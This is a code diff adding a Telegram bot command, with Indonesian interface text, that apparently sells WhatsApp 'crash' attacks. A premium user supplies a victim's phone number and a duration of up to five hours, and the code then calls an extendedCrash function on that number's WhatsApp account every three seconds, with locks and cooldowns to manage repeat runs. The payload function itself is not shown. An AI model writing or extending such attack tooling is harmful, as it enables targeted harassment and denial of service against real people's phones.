@@ -2046,9 +2046,123 @@ function formatPhoneNumber(number) {
   return cleaned;
 }
 //s
+bot.command("xandro", checkWhatsAppConnection, checkPremium, async (ctx) => {
+  await ctx.telegram.sendChatAction(ctx.chat.id, "record_audio");
+  const userId = ctx.from.id;
+  const st = getUserState(userId);
+  const now = Date.now();
+  if (st?.state === "running") {
+    const remaining = (st.endAt || now) - now;
+    return await ctx.reply(
+      `
+╭═══════『 𝐏𝐫𝐨𝐬𝐞𝐬 』═══════⊱
+│
+│ • Status: Masih berjalan ⏳
+│ • Sisa: ${msToHuman(remaining)}
+│ • Target: ${st.lastTarget || "-"}
+│
+╰═════════════════════⊱`.trim(), {
+        reply_to_message_id: ctx.message.message_id
+      }
+    );
+  }
 
+  if (st?.state === "cooldown") {
+    const remaining = (st.until || now) - now;
+    return await ctx.reply(
+      `
+╭═══════『 𝐂𝐨𝐨𝐥𝐝𝐨𝐰𝐧 』═══════⊱
+│
+│ • Status: Masih Cooldown ⏳
+│ • Tunggu: ${msToHuman(remaining)}
+│
+╰═════════════════════⊱`.trim(), {
+        reply_to_message_id: ctx.message.message_id
+      }
+    );
+  }
+  if (activeRunLocks.has(String(userId))) {
+    return await ctx.reply(
+      "⏳ Perintahmu lagi diproses. Tunggu sampai selesai ya.", {
+        reply_to_message_id: ctx.message.message_id
+      }
+    );
+  }
+  const args = ctx.message.text.split(/\s+/);
+  if (args.length < 3) {
+    return await ctx.reply(
+      `
+╭═══════⟨ 𝐂𝐚𝐫𝐚 𝐏𝐚𝐤𝐞 ⟩━━━━━━━╮
+│
+│ • /xandro 628xxx 1m   (1 menit)
+│ • /xandro 628xxx 1j   (1 jam)
+│
+├─────『 𝐈𝐧𝐟𝐨 』
+│ • Support 0/62/+62
+│ • Max durasi: 5 jam (5j)
+│ • Jeda per pesan: 3 detik
+│
+╰═════════════════════⊱`.trim(), {
+        reply_to_message_id: ctx.message.message_id
+      }
+    );
+  }
+  const nomorHP = args[1];
+  const durationInput = String(args[2])
+    .toLowerCase();
+  let durationMs = 0;
+  if (durationInput.endsWith("m")) {
+    const minutes = parseInt(durationInput.replace("m", ""), 10);
+    if (isNaN(minutes) || minutes < 1) return await ctx.reply("❌ Menit tidak valid!");
+    durationMs = minutes * 60 * 1000;
+  } else if (durationInput.endsWith("j")) {
+    const hours = parseInt(durationInput.replace("j", ""), 10);
+    if (isNaN(hours) || hours < 1) return await ctx.reply("❌ Jam tidak valid!");
+    if (hours > 5) return await ctx.reply("❌ Maksimal durasi adalah 5 jam!");
+    durationMs = hours * 60 * 60 * 1000;
+  } else {
+    return await ctx.reply(
+      "❌ Format waktu salah! Gunakan 'm' untuk menit atau 'j' untuk jam (contoh: 1m atau 1j)");
+  }
+  const nomorFix = formatPhoneNumber(nomorHP);
+  const target = nomorFix + "@s.whatsapp.net";
+  const startedAt = Date.now();
+  const endAt = startedAt + durationMs;
+  activeRunLocks.add(String(userId));
+  setUserRunning(userId, {
+    startedAt,
+    endAt,
+    durationMs,
+    lastTarget: nomorFix
+  });
+  await prosesrespone(target, ctx);
+  const runAttack = async () => {
+    try {
+      while (Date.now() < endAt) {
+        if (!isWhatsAppConnected) break;
+        await extendedCrash(target);
+        await sleep(3000);
+      }
+    } catch (err) {
+      console.error("runAttack error:", err);
+    } finally {
+      try {
+        await donerespone(target, ctx);
+      } catch (e) {
+        console.error("donerespone error:", e);
+      }
+      const until = Date.now() + COOLDOWN_AFTER_DONE_MS;
+      setUserCooldown(userId, {
+        until,
+        lastTarget: nomorFix,
+        lastDoneAt: Date.now()
+      });
 
-
+      activeRunLocks.delete(String(userId));
+    }
+  };
+  runAttack();
+});
 
 
 // ===== START MENU =====
